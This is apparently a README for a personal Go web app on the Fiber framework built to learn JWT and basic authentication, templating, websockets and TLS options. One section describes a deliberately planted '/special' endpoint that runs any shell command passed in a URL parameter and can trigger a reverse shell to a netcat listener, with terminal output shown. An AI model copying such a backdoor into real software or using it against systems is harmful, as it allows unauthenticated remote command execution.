---
runme:
  id: 01HMWQ2E4EZYRE2B89ENSJXWCF
  version: v2.2
---


Basic Go app for experimenging and learning of Go and authentication, including JWT. uilt on Fiber framework.


# Defined Routes:

- `/jwt/login` - endpoint used to get fresh JWT token. Is protetcted by basic HTTP auth
- `/jwt/secret` - endpoint which returns some "secret" data. Needs viable JWT token to be accessed, access denied otherwise.

- `/unprotetced` - just unprotected endpoint. Bare curl will work here.
- `/render` - endpoint which returs HTML rendered from template. For rendering uses values passed within URL parameters. 
There's a mix of optional and mandatory parameters to use. Missing optionals will default to some value. Missing mandatory will throw an error.

```go
mandatory1 := c.Query("mandatory1")
mandatory2Str := c.Query("mandatory2")
optional1 := c.Query("optional1", "defaultOptional1")
optional2Str := c.Query("optional2", "false")
optional3Str := c.Query("optional3", "3.14")

```

- `/special` handler - a small surprise - a remote execution. Checks for `lol` and `start` URL parameters.

`?start=true` will try to dial `tcp://127.0.0.1:9000` so you can use tool like `nc` to launch reverse shell.

```shell
# One terminal window
qbus@DESKTOP-CA07ILV:~/go-playground$ curl -i "http://localhost:8080/special?start=true"
HTTP/1.1 400 Bad Request
Date: Thu, 25 Jan 2024 00:51:30 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 30

Bad Request: Unknown exception


# Second terminal window
nc qbus@DESKTOP-CA07ILV:~/go-playground$ nc -n -l -p 9000
> id
uid=1000(qbus) gid=1000(qbus) groups=1000(qbus),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(netdev),1001(docker)

> 
```


`?lol=x` where `x` can be any Linux command will return command output (i.e. `ls`) to client.

```shell
qbus@DESKTOP-CA07ILV:~/go-playground$ curl -i "http://localhost:8080/special?lol=id"
HTTP/1.1 200 OK
Date: Thu, 25 Jan 2024 00:52:46 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 162

uid=1000(qbus) gid=1000(qbus) groups=1000(qbus),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(netdev),1001(docker)
```


- `/ws` - endpoint for experimenting with Websocket. You can test it by launching multiple browser windows and console within each.

How to utilize:

Access the browser's developer tools by right-clicking on the webpage and selecting "Inspect" or by pressing Ctrl + Shift + I (Windows/Linux) or Cmd + Opt + I (Mac) to open the Developer Tools. Navigate to the "Console" tab.

In the console, you can create a new WebSocket object using JavaScript

```js
// Create Websocket object
const socket = new WebSocket('ws://127.0.0.1:8080/ws/1');


// Add handlers
socket.addEventListener('open', (event) => {
  console.log('WebSocket connection opened:', event);
});

socket.addEventListener('message', (event) => {
  console.log('WebSocket message received:', event.data);
});

socket.addEventListener('error', (event) => {
  console.error('WebSocket error:', event);
});

socket.addEventListener('close', (event) => {
  console.log('WebSocket connection closed:', event);
});

// Send messages
socket.send('Hello, WebSocket server!');

// Gracefully close socket
socket.close();

```


Endpoints protected by `authMiddleware` - using either Basic auth or Bearer token (secret defined within code, not JWT)

- `/ping` - simple endpoint that returns "pong" (if authentication succeds)
- `/json` - returns JSON with some random data

# CLI commands

In short, server supports toggling HTTPS serving (this will work along with HTTP server).

If TLS is toggled on, there's possibility to provide path to certification files. 

`create-cert.sh` contains basic commands for self-signed certificates.

There's also possibility to change default port values for server.
```text
go run main.go -h

Usage:
  Go server [options]
Options:
  -cert-file string
        Path to the server certificate file (required if enable-tls is true)
  -enable-tls
        Enable serving encrypted app over HTTPS
  -h    Show usage/help (shorthand)
  -help
        Show usage/help
  -http-port int
        HTTP server port (default 8080)
  -https-port int
        HTTPS server port (default 8443)
  -key-file string
        Path to the private key file (required if enable-tls is true)
```

At last, `urltest.sh` contains some `curl` commands for experimenting with endpoints defined.